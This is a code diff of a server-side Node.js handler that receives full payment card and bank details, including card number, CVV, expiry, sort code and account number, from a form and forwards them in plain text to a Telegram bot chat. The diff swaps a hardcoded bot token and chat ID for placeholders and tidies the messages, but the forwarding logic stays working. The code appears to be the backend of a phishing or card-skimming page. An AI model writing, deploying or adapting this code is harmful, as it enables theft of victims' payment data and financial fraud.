@@ -3,24 +3,22 @@ import fetch from 'node-fetch';
 export default async function handler(req, res) {
     if (req.method === 'POST') {
         try {
-            // Include new fields in destructuring
-            const { cardNumber, sortCode, accountNumber, nameOnCard, expiryDate, cvv } = req.body;
-            
-            // Log all received details
-            console.log('Received payment details:', { 
-                cardNumber, 
-                sortCode, 
-                accountNumber, 
-                nameOnCard, 
-                expiryDate, 
-                cvv 
-            });
+            const {
+                cardNumber,
+                sortCode,
+                accountNumber,
+                nameOnCard,
+                expiryDate,
+                cvv
+            } = req.body;
 
-            // Update Telegram message with new fields
-            const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE';
-            const chatId = '7587120060';
+            // Telegram bot configuration
+            const telegramBotToken = 'YOUR_BOT_TOKEN'; // Replace with your bot token
+            const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
+            
+            // Format message
             const message = encodeURIComponent(
-                `New payment details:\n` +
+                `New Payment Details Submitted:\n\n` +
                 `Card Number: ${cardNumber}\n` +
                 `Sort Code: ${sortCode}\n` +
                 `Account Number: ${accountNumber}\n` +
@@ -28,21 +26,20 @@ export default async function handler(req, res) {
                 `Expiry Date: ${expiryDate}\n` +
                 `CVV: ${cvv}`
             );
-            
-            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
 
-            console.log('Sending message to Telegram:', telegramUrl);
+            // Send to Telegram
+            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
             const response = await fetch(telegramUrl);
             const result = await response.json();
 
             if (!response.ok) {
-                throw new Error(`Telegram API error: ${result.description}`);
+                throw new Error(`Telegram API Error: ${result.description}`);
             }
 
             res.status(200).json({ success: true });
         } catch (error) {
-            console.error('Error in submit.js:', error.message);
-            res.status(500).json({ error: 'Failed to process request' });
+            console.error('Error:', error.message);
+            res.status(500).json({ error: 'Submission failed' });
         }
     } else {
         res.status(405).json({ error: 'Method not allowed' });
